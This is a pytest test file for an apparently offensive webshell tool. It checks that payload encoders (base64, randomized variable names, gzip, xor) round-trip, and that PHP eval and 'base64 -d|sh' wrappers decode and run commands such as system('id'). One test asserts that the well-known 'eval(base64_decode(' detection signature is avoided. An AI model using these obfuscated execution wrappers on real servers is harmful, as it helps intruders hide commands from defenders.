"""Byte transforms + per-backend decode wrappers round-trip the payload."""

import base64
import re
import zlib

import pytest

from webshell_sniper.core.backends import CommandBackend, PHPBackend
from webshell_sniper.encoders import TRANSFORMS, get_transform


def test_registry_names():
    assert set(TRANSFORMS) == {"base64", "b64var", "gzip", "xor"}


def test_b64var_avoids_eval_base64decode_signature():
    php = "echo 'x';system('id');"
    out = PHPBackend().wrap_eval(get_transform("b64var").apply(php.encode()))
    # The classic combined signature — and the base64_decode literal — are gone.
    assert "eval(base64_decode(" not in out
    assert "base64_decode(" not in out
    # ...yet it still recovers the original payload.
    blob = re.search(r"'([A-Za-z0-9+/=]+)'\)\);", out).group(1)
    assert base64.b64decode(blob).decode() == php


def test_b64var_randomizes_variable_names():
    p = get_transform("b64var").apply(b"echo 1;")
    assert PHPBackend().wrap_eval(p) != PHPBackend().wrap_eval(p)


def test_unknown_transform_raises():
    with pytest.raises(ValueError, match="unknown encoder"):
        get_transform("rot13")


# -- byte transforms (language-neutral) --------------------------------------
def test_base64_transform_round_trip():
    p = get_transform("base64").apply(b"echo 'x';system('id');")
    assert p.name == "base64"
    assert base64.b64decode(p.b64) == b"echo 'x';system('id');"


def test_gzip_transform_round_trip():
    data = b"echo 'x';" * 50
    p = get_transform("gzip").apply(data)
    assert zlib.decompress(base64.b64decode(p.b64), -15) == data


def test_xor_transform_round_trip_and_randomized_key():
    data = b"echo 'secret';"
    p1 = get_transform("xor").apply(data)
    p2 = get_transform("xor").apply(data)
    assert p1.params["key"] != p2.params["key"] or p1.b64 != p2.b64
    key = p1.params["key"]
    raw = base64.b64decode(p1.b64)
    assert bytes(b ^ ord(key[i % len(key)]) for i, b in enumerate(raw)) == data


# -- PHP decode wrappers (eval backend) --------------------------------------
def test_php_wrap_base64():
    php = "echo 'x';"
    payload = get_transform("base64").apply(php.encode())
    out = PHPBackend().wrap_eval(payload)
    m = re.fullmatch(r"eval\(base64_decode\('([^']*)'\)\);", out)
    assert m and base64.b64decode(m.group(1)).decode() == php


def test_php_wrap_gzip():
    php = "echo 'x';" * 30
    out = PHPBackend().wrap_eval(get_transform("gzip").apply(php.encode()))
    m = re.fullmatch(r"eval\(gzinflate\(base64_decode\('([^']*)'\)\)\);", out)
    assert m and zlib.decompress(base64.b64decode(m.group(1)), -15).decode() == php


def test_php_wrap_xor_randomized_and_recoverable():
    php = "echo 'secret';"
    out1 = PHPBackend().wrap_eval(get_transform("xor").apply(php.encode()))
    out2 = PHPBackend().wrap_eval(get_transform("xor").apply(php.encode()))
    assert out1 != out2  # randomized key + variable names
    blob = re.search(r"base64_decode\('([^']*)'\)", out1).group(1)
    key = re.search(r"='([A-Za-z]{8})';", out1).group(1)
    data = base64.b64decode(blob)
    assert bytes(b ^ ord(key[i % len(key)]) for i, b in enumerate(data)).decode() == php


# -- command-shell decode wrapper --------------------------------------------
def test_command_wrap_base64_pipes_to_sh():
    payload = get_transform("base64").apply(b"echo TOK; id 2>&1; echo TOK")
    out = CommandBackend().wrap_command(payload)
    assert out == f"echo {payload.b64}|base64 -d|sh"


def test_command_backend_only_supports_base64():
    assert CommandBackend().supported_transforms == {"base64"}
    assert {"base64", "gzip", "xor"} <= PHPBackend().supported_transforms
    with pytest.raises(ValueError, match="cannot decode transform"):
        CommandBackend().wrap_command(get_transform("xor").apply(b"x"))
